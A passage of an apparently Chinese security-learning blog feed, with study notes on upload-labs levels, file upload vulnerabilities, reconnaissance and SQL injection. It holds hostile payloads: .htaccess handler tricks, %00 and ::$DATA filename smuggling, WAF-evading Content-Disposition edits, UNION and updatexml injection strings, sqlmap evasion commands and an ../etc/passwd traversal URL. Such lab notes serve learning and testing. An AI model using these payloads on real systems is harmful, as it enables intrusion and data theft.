<span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只要文件头符合上述三个文件类型即可，其他步骤和 14 关一致</p><h1 id="第16关-exif_imagetype"><a class="markdownIt-Anchor" href="#第16关-exif_imagetype">#</a> 第 16 关 - exif_imagetype ()</h1><p>16 关和 14、15 关的思路依旧是一样的，但是这里的区别是 exif_imagetype，其功能是检测 16 进制文件头并检测其后缀名，功能和 getimagesize 一样，但是速度比其要快得多，在 php 扩展中可以打开这个功能</p><img src="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/5.png" class><h1 id="第17关-二次渲染"><a class="markdownIt-Anchor" href="#第17关-二次渲染">#</a> 第 17 关 - 二次渲染</h1><p>现在很多网站都会对用户上传的图片进行再次压缩、裁剪等渲染操作，比如 php 中的 imagecreatefromjpeg ()，所以普通的图片马基本上都会被渲染掉</p><h2 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> 绕过</h2><p>GIF：在渲染前后的两张 GIF 不一样的数据块部分插入 webshell</p><p>PNG：要将数据写入到 PLTE 数据块或者 IDAT 数据块</p><p>JPG：需要用脚本将数据插入到特定的数据块，而且可能不会成功，要多次尝试</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2024/04/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/04/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞类型"><a class="markdownIt-Anchor" href="#漏洞类型">#</a> 漏洞类型</h1><h2 id="常规类"><a class="markdownIt-Anchor" href="#常规类">#</a> 常规类</h2><p>扫描获取上传；会员中心上传；后台系统上传；各种途径</p><h2 id="解析漏洞"><a class="markdownIt-Anchor" href="#解析漏洞">#</a> 解析漏洞</h2><p>apache；IIS6/7.X；nginx。IIS/7.X 和 nginx 是几乎一样的</p><h3 id="apache"><a class="markdownIt-Anchor" href="#apache">#</a> Apache</h3><p>未知扩展名解析漏洞；AddHandler 导致的解析漏洞；HTTPD 换行解析漏洞</p><h4 id="未知扩展名解析漏洞"><a class="markdownIt-Anchor" href="#未知扩展名解析漏洞">#</a> 未知扩展名解析漏洞</h4><p>apache 的解析漏洞依赖于一个特性，apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析</p><p>x.php.xxx.yyy<br> 识别最后的 yyy，如果不识别，就向前解析，直到识别<br>利用场景：<br>如果对方中间件 apache 属于低版本，我们可以利用这个文件上传上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发</p><p>实战中可以上传 rar，owf 等文件进行利用，如果上传 phpinfo.php.jpg，即使文件名中有.php 也会直接解析为.jpg，因为 apache 认识.jpg，停止继续向左识别</p><h3 id="nginx"><a class="markdownIt-Anchor" href="#nginx">#</a> Nginx</h3><p>Nginx 配置文件错误导致的解析漏洞；Nginx 字节任意代码执行漏洞；等等</p><h4 id="nginx配置文件错误导致的解析漏洞"><a class="markdownIt-Anchor" href="#nginx配置文件错误导致的解析漏洞">#</a> Nginx 配置文件错误导致的解析漏洞</h4><p>对于任意文件名，在后面添加 /xxx.php（xxx 为任意字符）后，即可将文件作为 php 解析。</p><p>例：info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。</p><h2 id="cms漏洞"><a class="markdownIt-Anchor" href="#cms漏洞">#</a> CMS 漏洞</h2><p>已知 cms 源码</p><h2 id="编辑器漏洞"><a class="markdownIt-Anchor" href="#编辑器漏洞">#</a> 编辑器漏洞</h2><p>fckeditor；ckeditor；kindeditor</p><h2 id="cve漏洞"><a class="markdownIt-Anchor" href="#cve漏洞">#</a> CVE 漏洞</h2><p>CVE-2019-12615；CVE-2015-5254</p><h1 id="验证绕过"><a class="markdownIt-Anchor" href="#验证绕过">#</a> 验证 / 绕过</h1><h2 id="前端"><a class="markdownIt-Anchor" href="#前端">#</a> 前端</h2><p>js 类防护，前端验证代码可以直接删除</p><h2 id="后端"><a class="markdownIt-Anchor" href="#后端">#</a> 后端</h2><h3 id="黑名单"><a class="markdownIt-Anchor" href="#黑名单">#</a> 黑名单</h3><p>大小写绕过；点绕过；空格绕过；配合解析漏洞绕过；双后缀名绕过</p><h4 id="特殊解析后缀"><a class="markdownIt-Anchor" href="#特殊解析后缀">#</a> 特殊解析后缀</h4><p>php3,php5 也可以解析为 php 同时不被拦截</p><h4 id="htaccess解析"><a class="markdownIt-Anchor" href="#htaccess解析">#</a> .htaccess 解析</h4><p>.htaccess 文件中，用 filematch 函数进行对文件名的匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这段代码的意思是，如果上传的文件名中有.jpg 这串字符，就以 php 文件来执行这个文件，由于网站没有对.htaccess 文件进行过滤，所以可以通过上传.htaccess 文件来对后续上传的文件进行一个绕过</p><h4 id="data绕过"><a class="markdownIt-Anchor" href="#data绕过">#</a> ::$DATA 绕过</h4><p>在 window 的时候如果文件名加::$DATA 会把::$DATA 之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA 之前的文件名，他的目的就是不检查后缀名</p><p>例如:“phpinfo.php::$DATA&quot;Windows 会自动去掉末尾的::$DATA 变成&quot;phpinfo.php”</p><h4 id="循环过滤"><a class="markdownIt-Anchor" href="#循环过滤">#</a> 循环过滤</h4><p>有的验证代码只会验证一次，而不会循环验证</p><p>比如将 php 替换为空，在只有一次循环的情况下，‘a.php’会被替换为’a.’<br>‘a.pphphp’就会被替换为’a.php’<br>而多次循环不会出现这种情况</p><h3 id="白名单"><a class="markdownIt-Anchor" href="#白名单">#</a> 白名单</h3><h4 id="mime绕过"><a class="markdownIt-Anchor" href="#mime绕过">#</a> MIME 绕过</h4><p>修改文件类型</p><h4 id="00截断"><a class="markdownIt-Anchor" href="#00截断">#</a> %00 截断</h4><p>我们上传 1.php%00.jpg 时，首先后缀名是合法的 jpg 格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg 格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到 %00 字符认为这是终止符，于是丢弃后面的.jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端<br>条件：<br>php&lt;5.3.4<br> 文件上传路径可控</p><p>…/upload/phpinfo.php%00/8220201011144424.jpg<br> 实际上传的为 phpinfo.php 而不是.jpg</p><p>如果是以 post 形式上传要将 %00 url 解码一下，get 会自动解码 post 不会</p><h3 id="其他"><a class="markdownIt-Anchor" href="#其他">#</a> 其他</h3><h4 id="二次渲染下的条件竞争"><a class="markdownIt-Anchor" href="#二次渲染下的条件竞争">#</a> 二次渲染下的条件竞争</h4><p>由于有些网站的二次渲染，文件在上传之后会首先直接上传到缓存当中，然后再重新对文件进行验证，如果文件有害就删除，无害则进行二次渲染。</p><p>而在计算机中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。比如当我们在打开一个文档的时候，我们要对其进行删除操作，系统会提示当前程序正在运行无法删除</p><p>那么我们可以利用这一点，进行恶意文件的上传</p><p>我们可以利用 bp 的爆破工具不断上传一个文件，同时我们又不断发送访问这个文件的请求，如果这个文件被我们访问成功了，那么后台就无法删除这个文件，实现木马的上传</p><p>文件头检测</p><p>突破 getimagesize</p><h4 id="路径重命名"><a class="markdownIt-Anchor" href="#路径重命名">#</a> 路径重命名</h4><p>当上传文件的时，有的系统会自动重命名这个文件，然后保存在对应的路径下<br> UPLOAD_PATH . ‘/’ .$file_name;<br> 那么我们可以这样写<br> upload/upload-19.php/.<br> 代码在验证的时候验证的是 upload-19.php/. 而不是 upload-19.php，这样就绕过了对 php 的验证，而保存的时候还是只会保存 php 文件</p><h1 id="waf绕过"><a class="markdownIt-Anchor" href="#waf绕过">#</a> WAF 绕过</h1><h2 id="数据溢出-防匹配xxx"><a class="markdownIt-Anchor" href="#数据溢出-防匹配xxx">#</a> 数据溢出 - 防匹配（xxx…）</h2><p>在数据包填入大量无关数据导致 waf 功能失效</p><h2 id="符号变异-防匹配"><a class="markdownIt-Anchor" href="#符号变异-防匹配">#</a> 符号变异 - 防匹配（’ &quot; ;）</h2><p>比如文件名为 &quot;a.php&quot;，可以把双引号去掉一个，写成 &quot;a.php，不要后面的双引号；或者直接去掉双引号；或者可以写成&quot;a&quot;.php;&quot;a&quot;a.php</p><h2 id="数据截断-防匹配00换行"><a class="markdownIt-Anchor" href="#数据截断-防匹配00换行">#</a> 数据截断 - 防匹配（%00; 换行）</h2><p>“a.php&quot;写成&quot;a.php%00.jpg” or “a.php::$DATA.jpg” or “a.php;.jpg” or “a.jpg;.php”<br> 这些不一定都能绕过，但也有可能绕过，具体情况具体分析判断<br>换行就是写成<br> “a<br>.<br>p<br>h<br>p”</p><h2 id="重复数据-防匹配参数多次"><a class="markdownIt-Anchor" href="#重复数据-防匹配参数多次">#</a> 重复数据 - 防匹配（参数多次）</h2><p>在 filename=&quot;a.php&quot; 之前，填入大量的其他 filename，比如</p><p>filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“b.jpg”;filename=“a.php”;</p><p>或者将数据包整个一段填入 filename 中<br>将<br> Content-Disposition: form-data; name=“upload_file” filename=“x.php”<br>Content-Type: image/jpeg<br> 写成<br> Content-Disposition: form-data; name=“upload_file”<br>filename=&quot;Content-Disposition: form-data; name=“upload_file&quot;x.php”<br>Content-Type: image/jpeg</p><p>就是将 filename 之前的一段当作 filename 的值填入进去，类似于递归，数据包层面上看表面上是给了值，但实际上没有真正的值，但安全狗会认为已经有值填入了</p><p>或者还可以这样写<br>将<br> Content-Disposition: form-data; name=“upload_file” filename=“x.php”<br>Content-Type: image/jpeg<br> 写成<br> Content-Disposition: form-data; name=“upload_file”<br>filename=“Content-Type: image/jpeg;x.php”<br>Content-Type: image/jpeg<br> 这里要注意，a.php 前要加分号，安全狗会认为到分号就结尾了，斜杠也可以起到类似于分号的作用，也就是说这里也可以写成 filename=“Content-Type: image/jpeg/x.php” 或者 filename=“Content-Type: image/jpegx/.php”</p><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz">#</a> Fuzz</h2><p>用 bp 导入 fuzz 字典进行爆破，但是因为速度太快可能会被拦截。也可以自己写字典然后倒入到里面去尝试，重要的是思路</p><h1 id="安全修复"><a class="markdownIt-Anchor" href="#安全修复">#</a> 安全修复</h1><p>后端验证：采用服务端验证模式<br>后缀检测：基于黑名单，白名单过滤<br> MIMEM 检测：基于上传自带类型检测<br>内容检测： 文件头，完整性检测</p><p>自带函数过滤：参考 uploadlabs 函数<br>自定义函数过滤：function check_file ()<br> WAF 防护产品：宝塔，云盾，安全公司产品等</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2024/03/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/03/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="有无web网站"><a class="markdownIt-Anchor" href="#有无web网站">#</a> 有无 web 网站</h1><p>通过多地 ping 工具判断有无 CDN，不同的情况根据不同的方法进行信息收集</p><h2 id="有cdn"><a class="markdownIt-Anchor" href="#有cdn">#</a> 有 CDN</h2><h3 id="国外请求"><a class="markdownIt-Anchor" href="#国外请求">#</a> 国外请求</h3><p>从国外对内地 ping，因为如果不是有海外业务的公司一般是不会设置海外的 CDN 的，所以从海外 ping 它的网站可以直接连接到主服务器</p><p><a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><h3 id="接口查询"><a class="markdownIt-Anchor" href="#接口查询">#</a> 接口查询</h3><p>查询网站的不同接口，每个接口对应着不同的功能，可以通过黑暗引擎搜集接口，找到目标的后台管理平台</p><h3 id="黑暗引擎"><a class="markdownIt-Anchor" href="#黑暗引擎">#</a> 黑暗引擎</h3><p><a href="https://fofa.info/">https://fofa.info/</a></p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>等等</p><h3 id="子域名"><a class="markdownIt-Anchor" href="#子域名">#</a> 子域名</h3><p>子域名可以通过 layer 等或者在线工具查询，</p><ul><li><p>有的网站主域名会做 CDN，但是子域名可能不会做</p></li><li><p>二级域名和三级域名查到的结果可能不一样</p></li><li><p>主域名和子域名查询到的可能不一样</p></li><li><p>DNs 历史记录 = 第三方接口 (接口查询)</p></li><li><p>采集 / 国外请求 (同类型访问)</p></li><li><p>邮件源码测试对比第三方查询 (地区分析)</p></li><li><p>黑暗引擎 (shodan 搜指定 hash 文件)</p></li><li><p>扫全网 fuckcdn，w8 fuckcdn，zmap 等</p></li><li><p>工具扫描</p></li><li><p>认为判定，根据网站的域名备案推测</p></li><li><p>本地清下 dns，然后 hosts 里写上得到的 ip 和域名，如果是 cdn 可能会出现刷新异常，如果打开很快大概率是原机</p></li></ul><h3 id="其他"><a class="markdownIt-Anchor" href="#其他">#</a> 其他</h3><p>邮件服务查询：我们访问别人，可能通过 CND，但别人访问我们通常不会走 CDN</p><p>遗留文件，扫描全网</p><p>黑暗引擎搜索特定文件</p><p>dns 历史记录，以量打量：CDN 节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</p><h2 id="无cdn"><a class="markdownIt-Anchor" href="#无cdn">#</a> 无 CDN</h2><h3 id="程序源码"><a class="markdownIt-Anchor" href="#程序源码">#</a> 程序源码</h3><h4 id="中间件"><a class="markdownIt-Anchor" href="#中间件">#</a> 中间件</h4><p>nignx，apache 等中间件漏洞</p><h4 id="内部位置cms"><a class="markdownIt-Anchor" href="#内部位置cms">#</a> 内部 / 位置 cms</h4><h4 id="开源cms"><a class="markdownIt-Anchor" href="#开源cms">#</a> 开源 cms</h4><p>wordpress，Z-Blog 等 cms 漏洞</p><h3 id="站点搭建"><a class="markdownIt-Anchor" href="#站点搭建">#</a> 站点搭建</h3><h4 id="目录站点"><a class="markdownIt-Anchor" href="#目录站点">#</a> 目录站点</h4><p>敏感文件 robots.txt、crossdomin.xml、sitemap.xml、源码泄漏文件</p><h4 id="端口站点"><a class="markdownIt-Anchor" href="#端口站点">#</a> 端口站点</h4><p>端口扫描工具，nmap，masscan</p><h4 id="子域名站点"><a class="markdownIt-Anchor" href="#子域名站点">#</a> 子域名站点</h4><p>子域名扫描工具，oneforall，layer，teemo，nslookup 等</p><h4 id="旁注c类站点"><a class="markdownIt-Anchor" href="#旁注c类站点">#</a> 旁注 / C 类站点</h4><p>旁站：是和目标网站在同一台服务器上的其它的网站，通过入侵安全性较差的旁站，之后可以通过提权跨目录等手段拿到目标服务器的权限。</p><p>工具：K8_C 段旁注工具、WebRobot、御剑、明小子 …</p><p>C 段：每个 IP 有 ABCD 四个段，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务。比如 192.168.3.0-255 的设备都处于同一个 c 段</p><p>目标 ip 为 192.168.1.128，可以入侵 192.168.1.* 的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。</p><p>工具：Cain、Sniffit 、Snoop、Tcpdump、Dsniff …</p><h4 id="类域名站点"><a class="markdownIt-Anchor" href="#类域名站点">#</a> 类域名站点</h4><p>一个站点可以用多个域名</p><h3 id="防护应用waf"><a class="markdownIt-Anchor" href="#防护应用waf">#</a> 防护应用 WAF</h3><p>安全狗，宝塔，云盾，安骑士</p><h3 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2">#</a> 其他</h3><h1 id="有无app"><a class="markdownIt-Anchor" href="#有无app">#</a> 有无 APP</h1><h2 id="涉及web"><a class="markdownIt-Anchor" href="#涉及web">#</a> 涉及 web</h2><h2 id="不涉及web"><a class="markdownIt-Anchor" href="#不涉及web">#</a> 不涉及 web</h2><h3 id="尝试提取"><a class="markdownIt-Anchor" href="#尝试提取">#</a> 尝试提取</h3><p>抓包获取信息</p><h3 id="逆向工程反编译"><a class="markdownIt-Anchor" href="#逆向工程反编译">#</a> 逆向工程反编译</h3><p>反编译查找源码漏洞，难度极大</p><h3 id="无web"><a class="markdownIt-Anchor" href="#无web">#</a> 无 web</h3><h1 id="有无其他"><a class="markdownIt-Anchor" href="#有无其他">#</a> 有无其他</h1><h2 id="资产信息"><a class="markdownIt-Anchor" href="#资产信息">#</a> 资产信息</h2><h3 id="各种平台查询"><a class="markdownIt-Anchor" href="#各种平台查询">#</a> 各种平台查询</h3><h3 id="whois备案"><a class="markdownIt-Anchor" href="#whois备案">#</a> whois 备案</h3><p>根据已知域名反差，分析出此域名的注册人，邮箱，电话等</p><p>工具：爱站网、站长工具、微步在线（<a href="https://x.threatbook.cn">https://x.threatbook.cn</a>）、<a href="http://site.ip138.com">site.ip138.com</a>、<a href="http://searchdns.netcraft.com">searchdns.netcraft.com</a>、国外 whois 信息查询网址：<a href="https://who.is">https://who.is</a></p><h3 id="github监控"><a class="markdownIt-Anchor" href="#github监控">#</a> github 监控</h3><h2 id="第三方应用"><a class="markdownIt-Anchor" href="#第三方应用">#</a> 第三方应用</h2><h3 id="数据库应用"><a class="markdownIt-Anchor" href="#数据库应用">#</a> 数据库应用</h3><h3 id="各种监管平台"><a class="markdownIt-Anchor" href="#各种监管平台">#</a> 各种监管平台</h3><h3 id="第三方应用-2"><a class="markdownIt-Anchor" href="#第三方应用-2">#</a> 第三方应用</h3><h2 id="服务接口"><a class="markdownIt-Anchor" href="#服务接口">#</a> 服务接口</h2><p>支付接口</p><p>储存服务</p><p>内部服务</p><h2 id="微信公众号"><a class="markdownIt-Anchor" href="#微信公众号">#</a> 微信公众号</h2><p>涉及 web</p><p>涉及 app</p><p>其他</p><h2 id="内部群"><a class="markdownIt-Anchor" href="#内部群">#</a> 内部群</h2><p>qq / 微信群</p><p>钉钉 / 工作群</p><p>其他</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/03/28/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/03/28/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="基本语句"><a class="markdownIt-Anchor" href="#基本语句">#</a> 基本语句</h1><p>备忘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">table_schema:库名</span><br><span class="line">table_name:表名</span><br><span class="line">column_name:列名</span><br><span class="line"></span><br><span class="line">union select 1,2,3,4</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;database()&#x27;</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;tablename&#x27;</span><br><span class="line"></span><br><span class="line">union select 1,name,password,4 from database()</span><br></pre></td></tr></table></figure><h1 id="函数"><a class="markdownIt-Anchor" href="#函数">#</a> 函数</h1><h2 id="截取函数"><a class="markdownIt-Anchor" href="#截取函数">#</a> 截取函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left（‘admin’,1）:左截取，从左边截取admin字符串，截取一位。</span><br><span class="line">right（&#x27;admin&#x27;,1）：右截取</span><br><span class="line">mid（&#x27;admin&#x27;,1,2）：截取admin字符串，从第一位开始截取，截取两位</span><br><span class="line">substr（&#x27;str&#x27;,pos）：截取从pos位置开始到最后的所有str字符串</span><br><span class="line">substring（&#x27;str&#x27;,pos,len）：</span><br></pre></td></tr></table></figure><ul><li><p>str 为列名 / 字符串</p></li><li><p>pos 为起始位置；mysql 中的起始位置 pos 是从 1 开始的；如果为正数，就表示从正数的位置往下截取字符串（起始坐标从 1 开始），反之如果起始位置 pos 为负数，那么 表示就从倒数第几个开始截取</p></li><li><p>len 为截取字符个数 / 长度。</p></li></ul><h2 id="判断函数"><a class="markdownIt-Anchor" href="#判断函数">#</a> 判断函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if（1=1，1，0）:</span><br><span class="line">case when 1=1 then 0 else 1 end:</span><br></pre></td></tr></table></figure><h2 id="报错函数"><a class="markdownIt-Anchor" href="#报错函数">#</a> 报错函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,注入语句,0x7e),1)=1</span><br><span class="line"></span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),31,32),0x7e),1)=&#x27;1</span><br></pre></td></tr></table></figure><h1 id="提交方式"><a class="markdownIt-Anchor" href="#提交方式">#</a> 提交方式</h1><p>get，post，cookie，request，http 头等</p><h1 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型">#</a> 数据类型</h1><p>数字型，字符型，搜索型</p><h1 id="查询方法"><a class="markdownIt-Anchor" href="#查询方法">#</a> 查询方法</h1><p>select，insert，delete，update，order by</p><h1 id="回显-盲注"><a class="markdownIt-Anchor" href="#回显-盲注">#</a> 回显、盲注</h1><p>回显注入，无回显注入，延时注入，布尔注入</p><h1 id="数据库类型"><a class="markdownIt-Anchor" href="#数据库类型">#</a> 数据库类型</h1><p>不同的数据库注入语法略有不同</p><h1 id="扩展"><a class="markdownIt-Anchor" href="#扩展">#</a> 扩展</h1><p>加解密注入，json 注入，ladp 注入，dnslog 注入，二次注入，堆叠查询，文件读写</p><h2 id="json注入"><a class="markdownIt-Anchor" href="#json注入">#</a> JSON 注入</h2><p>JSON 是独特的储存数据形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://api.zoomeye.org/user/login -d</span><br><span class="line">&#123;</span><br><span class="line"> &quot;username&quot;: &quot;foo@bar.com&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;foobar&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入点就可以在 foobar 后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &quot;foo@bar.com&#x27; and 1=1#&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之waf绕过</title>
      <link href="/2024/03/27/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bwaf%E7%BB%95%E8%BF%87/"/>
      <url>/2024/03/27/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bwaf%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap绕过waf"><a class="markdownIt-Anchor" href="#sqlmap绕过waf">#</a> sqlmap 绕过 waf</h1><h2 id="流量拦截"><a class="markdownIt-Anchor" href="#流量拦截">#</a> 流量拦截</h2><p>因为 sqlmap 的扫描速度很快，可能会被网站的流量监控给拦截，我们可以用时间函数或者代理池解决</p><h3 id="时间函数"><a class="markdownIt-Anchor" href="#时间函数">#</a> 时间函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --delay 1</span><br></pre></td></tr></table></figure><h3 id="代理池"><a class="markdownIt-Anchor" href="#代理池">#</a> 代理池</h3><h2 id="请求头拦截"><a class="markdownIt-Anchor" href="#请求头拦截">#</a> 请求头拦截</h2><p>sqlmap 在注入时，请求头被检测到就会被屏蔽，我们可以用随机 user-agent 或者搜索引擎的请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --random-agent</span><br></pre></td></tr></table></figure><p>可以自定义请求头比如用百度的请求头，因为搜索引擎收录站点也是用爬虫爬取的，所以一般的网站不会屏蔽搜索引擎的请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span><br></pre></td></tr></table></figure><p>扩展 1：有些 WAF 它拦截的可能是其他字段，可以使用 burp 抓包替换这个字段来进行绕过</p><p>扩展 2：将注入语句写在 txt 文件中，放在 sqlmap 目录下跑</p><h2 id="关键字替换"><a class="markdownIt-Anchor" href="#关键字替换">#</a> 关键字替换</h2><p>通过 tamper 模块的绕过脚本，将容易被屏蔽的关键字替换，sqlmap 自带很多脚本在 sqlmap/tamper 目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --tamper 模块名，模块名...</span><br></pre></td></tr></table></figure><h1 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单">#</a> IP 白名单</h1><p>当网站获取 ip 的方式为获取客户端的 ip 的话，就有可能存在伪造 i 绕过的情况，但从网络层获取 ip 的就没这个可能</p><p>方法：修改 http 的 header</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br><span class="line">x-Real-ip</span><br></pre></td></tr></table></figure><h1 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源">#</a> 静态资源</h1><p>特定的静态资源后缀请求，常见的静态文件 (.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/ sql.php?id=1</span><br><span class="line">http://10.9.9.201/sql.php/1.js?id=1</span><br></pre></td></tr></table></figure><p>备注: Aspx/php 只识别到前面的，.aspx/.php 后面基本不识别</p><h1 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单">#</a> url 白名单</h1><p>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.9.9.201/sql.php/admin.php?id=1</span><br><span class="line">http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd</span><br><span class="line">http://10.9.9.201/../../../ manage/../sql.asp?id=2</span><br></pre></td></tr></table></figure><p>waf 通过 /manage/ 进行比较，只要 url 中存在 /manage/ 就作为白名单不进行检测，这样我们可以通过 